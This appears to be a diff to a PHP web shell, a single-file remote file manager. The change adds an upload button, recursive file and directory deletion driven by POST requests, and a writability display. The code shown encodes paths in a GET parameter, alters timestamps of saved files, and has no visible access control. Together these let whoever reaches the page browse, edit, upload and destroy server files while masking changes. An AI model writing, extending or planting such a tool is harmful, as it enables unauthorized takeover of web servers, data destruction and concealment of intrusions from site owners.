@@ -210,9 +210,12 @@ function myFunction() {
 <div class="nav">
 <form method="post">
 	<div class="navbar" id="myTopnav">
-		<a href="?" class="home">Home</a>
+		<a href="<?= $home ?>" class="home">Home</a>
 		<a>
 			<button class="other">server info</button>
+		</a>
+		<a>
+			<button class="other">upload</button>
 		</a>
 		<a>
 			<button class="other">config</button>
@@ -234,8 +237,9 @@ function myFunction() {
     function start(){
         global $_POST,$_GET;
     
-        $result['currentpath'] = (isset($_GET['x'])) ? encrypt($_GET['x'],'de') : getcwd();
+        $result['cwd'] = (isset($_GET['x'])) ? encrypt($_GET['x'],'de') : getcwd();
         $result['currentpathen'] = (isset($_GET['x'])) ? $_GET['x'] : encrypt(getcwd(),'en');
+        $result['home'] = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
     
         return $result;
     }
@@ -282,7 +286,7 @@ function myFunction() {
             	</tr>
             	<form method="post">
             		<td colspan="3">
-            			<button onclick="window.location.href='?x=<?= $currentpath ?>'">files</button>
+            			<button onclick="window.location.href='?x=<?= $cwd ?>'">files</button>
                 		<button onclick="window.location.href='?x=<?= encrypt($file, 'en') ?>'">open</button>
                 		<button name="action" value="delete">delete</button>
                 		<button name="action" value="rename" disabled>rename</button>
@@ -350,7 +354,7 @@ function myFunction() {
             	</tr>
             	<form method="post">
             		<td colspan="3">
-            			<button onclick="window.location.href='?x=<?= $currentpath ?>'">files</button>
+            			<button onclick="window.location.href='?x=<?= $cwd ?>'">files</button>
                 		<button onclick="window.location.href='<?= $FILEPATH ?>'">view</button>
                 		<button name="action" value="edit">edit</button>
                 		<button name="action" value="delete">delete</button>
@@ -380,11 +384,11 @@ function myFunction() {
     	}
     }
     function getfiles($type) {
-        global $currentpath;
-        $dir = scandir($currentpath);
+        global $cwd;
+        $dir = scandir($cwd);
         $result = array();
         foreach ($dir as $key => $value) {
-            $current['fullname'] = $currentpath . DIRECTORY_SEPARATOR . $value;
+            $current['fullname'] = $cwd . DIRECTORY_SEPARATOR . $value;
             switch ($type) {
                 case 'dir':
                     if (!is_dir($current['fullname']) || $value == '.' || $value == '..') continue 2;
@@ -402,8 +406,8 @@ function myFunction() {
         } return $result;
     }
     function pwd() {
-        global $currentpath;
-        $path = $currentpath;
+        global $cwd;
+        $path = $cwd;
         $path = str_replace('\\','/',$path);
         $paths = explode('/',$path);
         $result = '';
@@ -454,19 +458,43 @@ function myFunction() {
         } return false;
     }
     function changename($filename, $newname) {
-    	global $currentpath;
-    	return rename($filename, $currentpath .DIRECTORY_SEPARATOR. htmlspecialchars($newname));
+    	global $cwd;
+    	return rename($filename, $cwd .DIRECTORY_SEPARATOR. htmlspecialchars($newname));
+    }
+    function delete($filename) {
+        if (is_dir($filename)) {
+            $scdir = scandir($filename);
+            foreach ($scdir as $key => $value) {
+                if ($value != '.' && $value != '..') {
+                    if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
+                        delete($filename . DIRECTORY_SEPARATOR . $value);
+                    } else {
+                        unlink($filename . DIRECTORY_SEPARATOR . $value);
+                    }
+                }
+            } if (rmdir($filename)) {
+                return true;
+            } else {
+                return false;
+            }
+        } else {
+            if (unlink($filename)) {
+                return true;
+            } else {
+                return false;
+            }
+        }
     }
     function save($filename, $text, $mode = 'w') {
-        global $currentpath;
-        if (substr($currentpath, -1) === DIRECTORY_SEPARATOR) {
+        global $cwd;
+        if (substr($cwd, -1) === DIRECTORY_SEPARATOR) {
             $handle = fopen($filename, $mode);
-            changeTime($currentpath.DIRECTORY_SEPARATOR.$filename);
+            changeTime($cwd.DIRECTORY_SEPARATOR.$filename);
             fwrite($handle, $text);
             fclose($handle);
         } else {
             $handle = fopen($filename, $mode);
-            changeTime($currentpath.DIRECTORY_SEPARATOR.$filename);
+            changeTime($cwd.DIRECTORY_SEPARATOR.$filename);
             fwrite($handle, $text);
             fclose($handle);
         }
@@ -506,6 +534,9 @@ function myFunction() {
 <br><br><br>
 <?php
 switch (@$_POST['action']) {
+	case 'delete':
+		delete($_POST['file']);
+		break;
 	case 'changename':
 		if (isset($_POST['submit'])) {
 			if (changename($_POST['file'], $_POST['newname'])) {
@@ -570,7 +601,7 @@ switch (@$_POST['action']) {
         <tr>
         <form method="post">
             <td colspan="3">
-                <button onclick="window.location.href='?x=<?= $currentpath ?>'">files</button>
+                <button onclick="window.location.href='?x=<?= $cwd ?>'">files</button>
                 <button onclick="window.location.href='<?= $FILEPATH ?>'">view</button>
                 <button name="action" value="edit" disabled>edit</button>
                 <button name="action" value="delete">delete</button>
@@ -604,7 +635,7 @@ switch (@$_POST['action']) {
 <tr>
 	<td colspan="6">
 		<center>
-			<?= pwd() ?>
+			<?= pwd() ?> ( <?= w__($cwd, "writable") ?> )
 		</center>
 	</td>
 </tr>
@@ -636,6 +667,7 @@ foreach (getfiles("dir") as $key => $value) {
                 <select name="action" onchange="if(this.value != '0') this.form.submit()">
                     <option selected disabled>action</option>
                     <option value="changename">changename</option>
+                    <option value="delete">delete</option>
                 </select>
                 <input type="hidden" name="file" value="<?= encrypt($value['fullname'], 'en') ?>">
             </td>
@@ -670,6 +702,7 @@ foreach (getfiles("file") as $key => $value) {
                     <option selected disabled>action</option>
                     <option value="edit">edit</option>
                     <option value="changename">changename</option>
+                    <option value="delete">delete</option>
                 </select>
                 <input type="hidden" name="file" value="<?= encrypt($value['fullname'], 'en') ?>">
             </td>
